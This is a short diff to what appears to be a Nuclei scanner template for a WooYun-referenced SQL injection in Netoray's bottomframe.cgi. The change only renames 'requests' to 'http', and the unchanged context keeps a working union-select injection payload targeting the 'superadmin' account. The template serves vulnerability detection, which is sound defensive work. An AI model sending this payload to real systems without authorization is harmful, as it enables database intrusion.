@@ -7,7 +7,7 @@ info:
   reference: http://www.anquan.us/static/bugs/wooyun-2016-0171547.html
   tags: Netoray,sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/bottomframe.cgi?user_name='))%20union%20select%20md5(1)%23where%20name%3d'superadmin'%23"
